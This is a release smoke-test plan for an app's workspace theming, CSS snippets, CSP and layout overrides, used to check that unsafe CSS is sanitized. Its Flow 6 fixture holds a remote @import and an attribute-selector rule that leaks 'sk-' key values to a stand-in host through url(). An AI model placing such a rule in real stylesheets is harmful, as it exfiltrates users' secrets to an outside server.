## Pre-Flight

Use a disposable Allbert Home and open `/workspace`:

```sh
export SMOKE_HOME=$(mktemp -d /tmp/allbert-v035-smoke.XXXXXX)
ALLBERT_HOME="$SMOKE_HOME" mix ecto.migrate.allbert
ALLBERT_HOME="$SMOKE_HOME" mix phx.server
```

If running the migration from a lower-level umbrella context, use the explicit
child-app command:

```sh
ALLBERT_HOME="$SMOKE_HOME" mix cmd --app allbert_assist mix ecto.migrate.allbert
```

v0.35 assumes v0.31 consolidated runtime paths/settings fragments, v0.32 made
`/workspace` the only operator home, v0.33 added app
handoff/clarification surfaces, and v0.34 moved Settings Central into a Canvas
destination inside the chat-primary shell. Theme and layout overrides must keep
handoff, clarification, Settings, and confirmation surfaces readable and
reachable.

Use the Chrome extension browser-control path for desktop UX, route/link, and
interaction verification. If the extension cannot set an exact narrow viewport,
use a controlled browser viewport as a supplement for the narrow-width check;
do not replace the desktop Chrome extension pass.

## Flow 1: Theme Settings Are Visible In Workspace

Operator opens **Settings** from the v0.34 WORKSPACE launcher section.

Expected behavior:

1. Theme and layout settings are listed with defaults.
2. The light/dark/system mode is `workspace.theme.mode` (migrated from the
   shipped `workspace.theme`; a legacy stored value still reads correctly).
3. `workspace.theme.active` can be set to a token theme name or cleared.
4. Snippets are disabled by default.
5. Layout override is disabled by default.
6. All writes use existing Settings Central action/audit behavior.
7. Settings shows read-only status for selected override basenames,
   fingerprints or mtimes, parse/sanitizer/layout state, and bounded
   diagnostics.

## Flow 2: Settings Account For Override Selection

Operator changes each v0.35 setting through the Settings Canvas or the existing
settings CLI:

- `workspace.theme.mode`
- `workspace.theme.active`
- `workspace.theme.snippets_enabled`
- `workspace.theme.enabled_snippets`
- `workspace.layout.override_enabled`

Expected behavior:

1. Every write goes through Settings Central and appends the normal settings
   audit record under `<ALLBERT_HOME>/settings/audit/`.
2. `<ALLBERT_HOME>/settings/settings.yml` stores only gates and selections
   (mode, active theme basename, snippet basenames, layout override switch).
3. Raw token YAML, snippet CSS, and layout YAML file contents are not copied
   into Settings Central.
4. The Settings Canvas status reflects the selected file basenames,
   fingerprints/mtimes, parse/sanitizer/layout status, and bounded diagnostics.
5. Diagnostics do not expose raw file contents, secrets, or unsafe absolute
   paths.

## Flow 3: Token Theme Retints Workspace

Operator writes `<ALLBERT_HOME>/themes/midnight.yaml` and sets
`workspace.theme.active=midnight`.

Expected behavior:

1. `/theme/user.css` serves a CSS variable block.
2. `/workspace` loads the stylesheet after `app.css`.
3. The token theme is a single set that retints on top of the current
   `workspace.theme.mode`; it applies in both light and dark and never alters
   layout-structural variables or the AppBar geometry.
4. Colors/density/radii visibly change on reload with no asset rebuild.
5. Chrome desktop and narrow verification, in both modes, show no overflow or
   illegible contrast regression.

Failure behavior:

- Missing or invalid token files fall back to defaults per-key with bounded
  warnings.

Manual fixture:

```yaml
tokens:
  allbert-surface-0: "#101820"
  allbert-surface-1: "#17212b"
  allbert-text-strong: "#f8fafc"
  allbert-text-soft: "#b6c2cf"
  allbert-line: "#314457"
  allbert-accent: "#7cc7d8"
```

## Flow 4: Invalid Token File Falls Back Safely

Operator selects a malformed theme file.

Expected behavior:

1. The workspace still loads.
2. Invalid keys/values are ignored.
3. Defaults fill missing values.
4. Operator-visible diagnostics name the rejected keys without exposing
   secrets or file contents unnecessarily.

Manual invalid fixture:

```yaml
tokens:
  color-base-100: "#000000"
  workspace-root-grid: "1fr"
  allbert-accent: "not-a-color"
```

## Flow 5: CSS Snippet Applies Only When Enabled

Operator writes `<ALLBERT_HOME>/themes/snippets/compact.css`.

Expected behavior:

1. With `workspace.theme.snippets_enabled=false`, no snippet CSS is served.
2. With snippets enabled and `compact.css` listed in
   `workspace.theme.enabled_snippets`, sanitized CSS is served.
3. The snippet loads after token CSS and can adjust local presentation.

Failure behavior:

- Unknown snippet names, path traversal, non-CSS files, and missing files are
  rejected with bounded diagnostics.

Manual safe fixture:

```css
#workspace-shell .workspace-chat-pane {
  font-size: 0.95rem;
}
```

## Flow 6: Unsafe CSS Is Stripped Or Rejected

Operator enables a snippet containing `@import`, `url()`, `image-set()`, or a
remote font/source construct.

Expected behavior:

1. `@import` is rejected.
2. `url()` and `image-set()` are stripped.
3. Remote font/source constructs are stripped.
4. The served CSS is empty if the file is entirely unsafe.
5. The workspace remains usable.
6. CSP blocks remote style/image fetches.

Manual unsafe fixture:

```css
@import "https://example.invalid/theme.css";
#workspace-shell input[value^="sk-"] {
  background-image: url("https://example.invalid/leak");
}
```

## Flow 7: Layout Override Reorders Workspace Destinations

Operator writes `<ALLBERT_HOME>/workspace/layout.yaml` and sets
`workspace.layout.override_enabled=true`.

Expected behavior:

1. Valid launcher destination ordering/hiding is reflected in `/workspace`.
   Destination ids use the grammar `output` | `app:<id>` | `workspace:<tool>`.
2. Valid panel pins appear in allowed Canvas destination groups.
3. The AppBar (brand, context indicator, theme toggle, destination quick-links)
   is fixed chrome and is not reordered or hidden by layout YAML; layout
   override governs only the left launcher and Canvas.
4. The Settings and Output destinations stay reachable even if the layout file
   tries to hide them (the attempt warns; everything else applies).
5. Unknown destinations, unknown retained zone labels, unknown panels, or
   invalid placements are ignored per-key with warnings.
6. Layout data cannot create routes, components, action bindings, routing
   context, or permissions.

Failure behavior:

- Invalid layout YAML falls back to the default v0.34 launcher and Canvas
  destination layout.
- `app:allbert` is invalid; neutral Allbert output is represented by `output`.

Manual valid fixture:

```yaml
default_destination: output
launcher_order:
  - output
  - app:stocksage
  - workspace:settings
  - workspace:jobs
  - workspace:objectives
hidden_destinations:
  - workspace:jobs
```

Manual invalid fixture:

```yaml
default_destination: app:allbert
hidden_destinations:
  - output
  - workspace:settings
active_app: stocksage
route: /objectives
```

## Flow 8: Disable A Problematic Override

Operator has an aggressive layout/snippet override and wants out.

Expected behavior:

1. The AppBar context indicator and theme toggle remain reachable regardless of
   the layout file (fixed chrome).
2. Settings remains reachable (non-hideable destination) to clear
   `workspace.theme.active`, disable snippets, or set
   `workspace.layout.override_enabled=false`.
3. The same switches are reachable via the settings CLI action without the UI,
   as a guaranteed escape hatch.
4. Turning a master switch off restores the default v0.34 presentation/layout
   on reload with no leftover state.

## DOM Ids And Events

Stable handles for tests and Chrome manual verification:

| Surface | Handle | Expected use |
|---|---|---|
| Theme stylesheet | `link[href^="/theme/user.css"]` | Token stylesheet loaded after app CSS |
| Snippet stylesheet | `link[href^="/theme/snippets.css"]` | Sanitized snippet stylesheet |
| Workspace shell | `#workspace-shell` | Visual verification target |
| AppBar | `#allbert-appbar` | Fixed chrome (not layout-reorderable) |
| Context indicator | `#workspace-context-indicator` | Always reachable; routing context |
| Theme toggle | `#workspace-theme-toggle` | `workspace.theme.mode` control |
| Settings panel | `#workspace-settings-panel` | Theme setting controls |
| Theme diagnostics | `#workspace-theme-diagnostics` | Bounded warnings |
| Launcher destination | `#workspace-dest-<id>`, `[data-destination="<id>"]` | Layout override verification (`output`/`app:<id>`/`workspace:<tool>`) |
| Canvas panel | shipped panel node id (verify against v0.34 renderer, e.g. `#workspace-node-workspace-panel-<app-id>-<surface-id>-<node-id>`) | Panel pin verification |

Defensive console snippets for manual smoke checks:

```js
(() => {
  const shell = document.querySelector("#workspace-shell");
  return {
    shellPresent: Boolean(shell),
    theme: shell?.dataset?.theme ?? null,
    workspaceTheme: shell?.dataset?.workspaceTheme ?? null
  };
})()
```

```js
(() => {
  return Array.from(document.querySelectorAll("[data-destination]"))
    .map((node) => node.dataset.destination)
    .filter(Boolean);
})()
```

```js
(() => {
  const diagnostics = document.querySelector("#workspace-theme-diagnostics");
  return diagnostics ? diagnostics.textContent.trim() : "";
})()
```

## Smoke Checklist

- Theme settings appear inside `/workspace`.
- Settings writes for v0.35 keys create audit records, while raw CSS/YAML file
  contents stay out of `settings.yml`.
- Settings status shows basenames, fingerprints/mtimes, validation state, and
  bounded diagnostics for active overrides.
- Token theme retints with no rebuild.
- Invalid token file falls back safely.
- Safe snippet applies only when explicitly enabled.
- Unsafe snippet constructs are stripped/rejected and diagnostics appear.
- CSP header is present.
- Layout override reorders/hides launcher destinations and pins panels.
- Settings/Output stay reachable and the AppBar is untouched under an aggressive
  layout; the `workspace.layout.override_enabled` master switch (UI or CLI)
  disables overrides.
- `workspace.theme` migrates to `workspace.theme.mode` with a working legacy
  read.
- Invalid layout data falls back safely.
- Chrome extension verification covers desktop UX in both modes. Narrow-width
  verification may use a controlled browser viewport as a supplement if the
  extension cannot set an exact mobile viewport.

## Milestone User Testing

### M1-M2 Theme Roots And Tokens

1. Confirm theme roots exist in a disposable Allbert Home.
2. Set `workspace.theme.mode`, `workspace.theme.active`,
   `workspace.theme.snippets_enabled`, `workspace.theme.enabled_snippets`, and
   `workspace.layout.override_enabled`; confirm settings audit entries.
3. Confirm `settings.yml` stores only setting values, not raw YAML/CSS/layout
   contents.
4. Select a valid token theme.
5. Reload `/workspace`; confirm visible retinting and a changed `?v=` on the
   theme stylesheet when the file changes.
6. Select an invalid theme; confirm fallback and bounded diagnostics.

### M3-M4 CSP And Snippets

1. Confirm CSP headers on `/workspace` and theme routes.
2. Confirm theme responses include `ETag`.
3. Enable a safe snippet; confirm presentation changes.
4. Enable unsafe snippet; confirm strip/reject behavior and warnings.
5. Confirm remote fetch attempts are neutralized by sanitizer and CSP.

### M5 Layout Override

1. Enable valid layout YAML; confirm destination order/hide/pin behavior.
2. Add invalid keys, including `app:allbert`, hidden Settings/Output, and
   `active_app`; confirm per-key warnings and safe fallback.
3. Disable `workspace.layout.override_enabled`; confirm the default v0.34
   launcher and Canvas layout return on reload.

### M6 Closeout

1. Focused tests and the full release gate passed.
2. Chrome extension desktop verification passed for token, snippet, layout,
   fallback, and Settings-accountable behavior; narrow viewport coverage
   remains available as supplemental manual verification.
3. README, roadmap, ADR 0025, agent-context map, future-features, and release
   notes reflect the implemented `v0.35.0` scope.
